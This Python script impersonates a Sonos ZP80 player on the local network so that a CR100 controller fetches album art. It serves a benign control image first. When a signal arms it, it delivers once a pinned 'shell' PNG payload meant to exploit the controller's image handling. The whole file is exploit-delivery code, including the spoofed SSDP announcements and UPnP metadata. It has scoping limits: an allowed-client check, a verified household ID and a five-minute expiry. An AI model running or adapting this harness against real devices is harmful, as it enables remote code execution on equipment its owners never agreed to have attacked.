#!/usr/bin/env python3
"""Serve benign art, then arm one pinned CR100 shell PNG metadata update.

SIGUSR1 arms the payload only after the allowed controller fetched benign art.
The payload and room remain advertised until explicit stop or five-minute
expiry; the payload bytes are served only once. The sender never touches the
controller.
"""
import argparse
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import secrets
import signal
import socket
import sys
import threading
import time

HERE = Path(__file__).resolve().parent
PEER_DIR = Path(os.environ['CR100_ZP80_PEER_DIR']) if os.environ.get('CR100_ZP80_PEER_DIR') else (
    HERE if (HERE / 'zp80_peer.py').is_file() else HERE.parents[1] / 'tools/zp80')
if not (PEER_DIR / 'zp80_peer.py').is_file():
    raise SystemExit('ZP80 peer library unavailable; set CR100_ZP80_PEER_DIR')
sys.path.insert(0, str(PEER_DIR))
import zp80_peer as zp

EXPECTED_SHA256 = '5173a58755f4f092e3c34addcb9c2b6d9b4b746e209802511e3469177583c053'
SSDP_GROUP = '239.255.255.250'
CONTROL_PNG = bytes.fromhex(
    '89504e470d0a1a0a0000000d4948445200000001000000010802000000907753de'
    '0000000c49444154789c635069b801000248017d0738cd520000000049454e44ae426082')


def log(event, **fields):
    print(json.dumps({'time': round(time.time(), 3), 'event': event, **fields}), flush=True)


def didl(art_url=None):
    art = '<upnp:albumArtURI>' + art_url + '</upnp:albumArtURI>' if art_url else ''
    return ('<DIDL-Lite xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/" '
            'xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/">'
            '<item id="one-shot:track" parentID="-1" restricted="true">'
            '<dc:title>Firmware setup</dc:title><dc:creator>CR100 Bridge</dc:creator>'
            '<upnp:album>Installation</upnp:album>'
            '<upnp:class>object.item.audioItem.musicTrack</upnp:class>'
            '<res protocolInfo="http-get:*:audio/mpeg:*">'
            'x-rincon-mp3radio://one-shot-fixture/track</res>'
            + art + '</item></DIDL-Lite>')


class State(zp.PeerState):
    def __init__(self, config, control_path):
        super().__init__(config)
        self.transport = 'PLAYING'
        self.uri = 'x-rincon-mp3radio://one-shot-fixture/track'
        self.metadata = didl('http://%s:%d%s' % (
            config.advertise_ip, config.port, control_path))

    def set_art(self, art_path):
        with self.lock:
            self.metadata = didl('http://%s:%d%s' % (
                self.config.advertise_ip, self.config.port, art_path))

    def withdraw(self):
        with self.lock:
            self.metadata = didl()

    def last_change(self, rendering=False):
        value = super().last_change(rendering)
        if not rendering:
            value = value.replace('<NumberOfTracks val="0"', '<NumberOfTracks val="1"')
            value = value.replace('<CurrentTrack val="0"', '<CurrentTrack val="1"')
        return value

    def action(self, service, action, args):
        values, changed = super().action(service, action, args)
        if service == 'AVTransport':
            with self.lock:
                metadata = self.metadata
            values.update(NrTracks='1', Track='1', CurrentTrack='1',
                          CurrentTrackMetaData=metadata, TrackMetaData=metadata,
                          CurrentTrackURI=self.uri, TrackURI=self.uri)
        return values, changed


class OneShot:
    def __init__(self, allowed_client, control_path, art_path, payload):
        self.allowed_client = allowed_client
        self.control_path = control_path
        self.art_path = art_path
        self.payload = payload
        self.lock = threading.Lock()
        self.control_seen = False
        self.armed = False
        self.consumed = False

    def handler(self):
        owner = self

        class Handler(zp.PeerHandler):
            def permitted(self):
                if self.client_address[0] == owner.allowed_client:
                    return True
                log('request-denied', source=self.client_address[0], path=self.path)
                self.reply(403, b'Forbidden', 'text/plain')
                return False

            def do_GET(self):
                if not self.permitted(): return
                if self.path.startswith('/art/'):
                    if self.path == owner.control_path:
                        log('control-art-get', source=self.client_address[0],
                            path=self.path, bytes=len(CONTROL_PNG))
                        try:
                            self.reply(200, CONTROL_PNG, 'image/png',
                                       headers={'Cache-Control': 'no-store'})
                        except (BrokenPipeError, ConnectionResetError, OSError) as error:
                            log('control-response-error', error=type(error).__name__)
                        else:
                            with owner.lock:
                                owner.control_seen = True
                            log('control-response-complete', source=self.client_address[0])
                        return
                    with owner.lock:
                        deliver = (self.path == owner.art_path and owner.armed
                                   and not owner.consumed)
                        if deliver:
                            owner.consumed = True
                    if not deliver:
                        log('art-denied', source=self.client_address[0], path=self.path)
                        self.reply(404, b'Not found', 'text/plain')
                        return
                    log('payload-consumed', source=self.client_address[0],
                        path=self.path, bytes=len(owner.payload), sha256=EXPECTED_SHA256)
                    try:
                        self.reply(200, owner.payload, 'image/png',
                                   headers={'Cache-Control': 'no-store'})
                        log('payload-response-complete', source=self.client_address[0])
                    except (BrokenPipeError, ConnectionResetError, OSError) as error:
                        log('payload-response-error', error=type(error).__name__)
                    finally:
                        log('payload-served-room-held')
                    return
                return super().do_GET()

            def do_POST(self):
                if self.permitted(): return super().do_POST()

            def do_SUBSCRIBE(self):
                if self.permitted(): return super().do_SUBSCRIBE()

            def do_UNSUBSCRIBE(self):
                if self.permitted(): return super().do_UNSUBSCRIBE()

        return Handler


def unicast_announcements(peer, destination, stop, port=1900, interval=20):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    try:
        sock.bind((peer.config.advertise_ip, 0))
        while not stop.is_set():
            for target in peer.ssdp_targets():
                sock.sendto(peer.ssdp_packet(target, alive=True), (destination, port))
            log('unicast-alive', destination=destination,
                packets=len(peer.ssdp_targets()))
            if stop.wait(interval): break
        for target in peer.ssdp_targets():
            packet = peer.ssdp_packet(target, alive=True).replace(
                b'NTS: ssdp:alive', b'NTS: ssdp:byebye')
            sock.sendto(packet, (destination, port))
        log('unicast-byebye', destination=destination)
    except OSError as error:
        log('unicast-error', error=str(error))
    finally:
        sock.close()


def multicast_byebye(peer):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF,
                        socket.inet_aton(peer.config.advertise_ip))
        for target in peer.ssdp_targets():
            packet = peer.ssdp_packet(target, alive=True).replace(
                b'NTS: ssdp:alive', b'NTS: ssdp:byebye')
            sock.sendto(packet, (SSDP_GROUP, 1900))
    finally:
        sock.close()


def parse_args(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--payload', type=Path, required=True)
    parser.add_argument('--bind', default='127.0.0.1')
    parser.add_argument('--advertise-ip')
    parser.add_argument('--port', type=int, default=1400)
    parser.add_argument('--allowed-client', default='127.0.0.1')
    parser.add_argument('--household')
    parser.add_argument('--mac')
    parser.add_argument('--room', default='One-shot artwork')
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--enable-discovery', action='store_true')
    parser.add_argument('--unicast-target')
    args = parser.parse_args(argv)
    bind = ipaddress.IPv4Address(args.bind)
    args.advertise_ip = args.advertise_ip or args.bind
    advertised = ipaddress.IPv4Address(args.advertise_ip)
    allowed = ipaddress.IPv4Address(args.allowed_client)
    unicast = ipaddress.IPv4Address(args.unicast_target) if args.unicast_target else None
    if not 1 <= args.duration <= 300:
        parser.error('--duration must be 1..300 seconds')
    if not 1 <= args.port <= 65535:
        parser.error('--port must be 1..65535')
    if unicast and not args.enable_discovery:
        parser.error('--unicast-target requires --enable-discovery')
    if not bind.is_loopback:
        if not args.household or not args.mac or allowed.is_loopback:
            parser.error('non-loopback requires explicit household, MAC, and controller IP')
        if advertised != bind:
            parser.error('advertised IP must equal bind IP')
        if bind in ipaddress.IPv4Network('192.168.69.0/24'):
            if args.household == 'Sonos_EMULATED_CR100':
                parser.error('use the verified physical household ID')
            if not 100 <= int(str(bind).split('.')[-1]) <= 254:
                parser.error('SonosNet fixture must use a verified-free .100-.254 address')
            if allowed not in ipaddress.IPv4Network('192.168.69.0/24'):
                parser.error('controller must be on SonosNet')
            if unicast != allowed:
                parser.error('SonosNet unicast target must equal allowed controller IP')
    args.household = args.household or 'Sonos_EMULATED_CR100'
    args.mac = args.mac or '02:00:00:00:ab:09'
    return args


def main(argv=None):
    args = parse_args(argv)
    payload = args.payload.read_bytes()
    actual_sha = hashlib.sha256(payload).hexdigest()
    if actual_sha != EXPECTED_SHA256:
        raise SystemExit('payload SHA-256 does not match pinned fixed-gadget PNG')
    token = secrets.token_hex(8)
    control_path = '/art/control.png?warm=' + token
    art_path = '/art/one-shot.png?once=' + token
    config = zp.Config(bind=args.bind, advertise_ip=args.advertise_ip,
                       port=args.port, household=args.household, mac=args.mac,
                       room=args.room, callback_network=None,
                       boot_sequence=int(time.time()) & 0xffffffff)
    peer = zp.ZP80Peer(config)
    peer.state = State(config, control_path)
    stop = threading.Event()
    arm_requested = threading.Event()
    one_shot = OneShot(args.allowed_client, control_path, art_path, payload)
    peer.http.RequestHandlerClass = one_shot.handler()
    signal.signal(signal.SIGTERM, lambda *_: stop.set())
    signal.signal(signal.SIGINT, lambda *_: stop.set())
    signal.signal(signal.SIGUSR1, lambda *_: arm_requested.set())
    peer.start(ssdp=args.enable_discovery, netstart=False)
    unicast_thread = None
    if args.unicast_target:
        unicast_thread = threading.Thread(target=unicast_announcements,
            args=(peer, args.unicast_target, stop), name='scoped-ssdp', daemon=True)
        unicast_thread.start()
    log('ready', bind=args.bind, port=args.port, allowed_client=args.allowed_client,
        household=config.household, udn=config.udn, control_path=control_path,
        art_path=art_path, arming='SIGUSR1 after control-art-get',
        payload_sha256=EXPECTED_SHA256, discovery=args.enable_discovery,
        unicast_target=args.unicast_target, expires_in=args.duration)
    try:
        deadline = time.monotonic() + args.duration
        while not stop.is_set() and time.monotonic() < deadline:
            if arm_requested.is_set():
                arm_requested.clear()
                with one_shot.lock:
                    can_arm = one_shot.control_seen and not one_shot.armed
                    if can_arm:
                        one_shot.armed = True
                if can_arm:
                    peer.state.set_art(art_path)
                    peer.publish('AVTransport')
                    log('payload-armed', art_path=art_path)
                else:
                    log('arm-refused', reason='control art not fetched or already armed')
            stop.wait(.1)
    finally:
        stop.set()
        peer.state.withdraw()
        try: peer.publish('AVTransport')
        except Exception as error:
            log('withdraw-notify-error', error=type(error).__name__)
        log('art-withdrawn')
        if unicast_thread: unicast_thread.join(timeout=3)
        peer.close()
        if args.enable_discovery:
            try: multicast_byebye(peer)
            except OSError as error: log('byebye-error', error=str(error))
        log('stopped', control_seen=one_shot.control_seen,
            payload_armed=one_shot.armed, payload_consumed=one_shot.consumed)


if __name__ == '__main__':
    main()
